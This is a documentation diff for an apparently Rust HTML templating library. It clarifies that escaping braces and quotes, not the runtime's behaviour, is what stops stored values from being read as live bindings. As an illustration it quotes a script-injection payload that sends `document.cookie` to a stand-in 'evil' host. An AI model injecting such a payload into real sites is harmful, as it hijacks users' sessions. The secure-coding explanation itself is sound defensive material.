@@ -272,8 +272,10 @@ is written as it stands, its `@{…}` rendered in place. Keep large modules in
 Rust strings and values are escaped in text and attribute position. Attributes
 also escape quotes. Braces are escaped too, as `&#123;` and `&#125;`, so a
 stored value such as `{fetch('//evil/' + document.cookie)}` shows as text and
-never even looks like a binding. The browser runtime only runs code a template
-compiled, so a `{…}` nobody wrote in `html!` stays text either way.
+never even looks like a binding. The escaping is what protects it: the browser
+runtime never compiles page text, but a live `{…}` it finds is still looked up
+— a bare name reads the block's state, and the exact source of a compiled
+binding runs that binding.
 
 - `Html::escape(text)` creates safe text markup.
 - `Html::from_raw(raw)` trusts the caller completely; use only with sanitized
